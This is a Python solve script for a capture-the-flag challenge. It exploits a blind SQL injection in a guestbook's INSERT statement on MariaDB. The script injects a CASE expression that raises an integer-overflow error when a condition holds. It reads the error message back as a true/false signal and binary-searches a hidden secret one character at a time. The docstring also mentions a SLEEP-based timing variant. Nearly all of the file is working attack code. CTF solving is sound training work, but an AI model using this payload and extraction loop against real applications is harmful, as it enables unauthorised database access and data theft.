#!/usr/bin/env python3
"""
Guestbook (sqli, 400, expert) — CWE-89 blind SQLi on an INSERT. DB: **MariaDB**.

INSERT INTO notes(name,message) VALUES('<name>','<message>') with `name`
concatenated raw. No data/count/marker channel, but a SQL error shows a distinct
flash ("...ruffled - your note was not saved."). We break out of the name string,
comment off the rest, and put a CASE in the message slot that raises a runtime
error only when our predicate is true:

    name = x', (CASE WHEN (<cond>) THEN <overflow error> ELSE 0 END))--

cond TRUE -> error -> INSERT fails -> "ruffled";  FALSE -> 0 -> saved.
Binary-search vault.secret with ascii(substring(...)) (MariaDB), compared
numerically so the DB's case-insensitive collation doesn't skew it.

The intended channel was time-based (SLEEP(3) in the same message slot) -- "measure
the silence"; the error flash is just a faster boolean on the same breakout.
Sessionless on purpose: the "ruffled" flash lives in the Flask session cookie, so a
reused session desyncs which response carries it (symptom: all chars read 0).

Usage:
    python3 solve.py                          # defaults to sqli6.chal.deti:8035
    python3 solve.py http://sqli6.chal.deti:8035
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://sqli6.chal.deti:8035"
ERR = "(9223372036854775807*9223372036854775807)"  # MariaDB BIGINT overflow -> error
requests_made = 0


def oracle(cond: str) -> bool:
    """TRUE when the predicate holds (query errors -> 'ruffled'). Fresh request each call."""
    global requests_made
    name = f"x', (CASE WHEN ({cond}) THEN {ERR} ELSE 0 END))-- "
    r = requests.post(f"{BASE}/", data={"name": name, "message": "hi"}, timeout=15)
    requests_made += 1
    return "ruffled" in r.text


def bsearch(make_cond, lo: int, hi: int) -> int:
    """Smallest v with value <= v, using `value > mid` oracle. make_cond(mid)->cond."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(make_cond(mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main() -> int:
    length = bsearch(lambda m: f"(SELECT length(secret) FROM vault LIMIT 1) > {m}", 0, 256)
    print(f"[i] secret length: {length}")

    out = []
    for i in range(1, length + 1):
        code = bsearch(
            lambda m, i=i: f"(SELECT ascii(substring(secret,{i},1)) FROM vault LIMIT 1) > {m}",
            0, 127)
        out.append(chr(code))
        sys.stdout.write(out[-1]); sys.stdout.flush()
    print()

    data = "".join(out)
    print(f"[i] requests made: {requests_made}")
    m = re.search(r"flag\{[^}]*\}", data)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] secret: {data!r}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
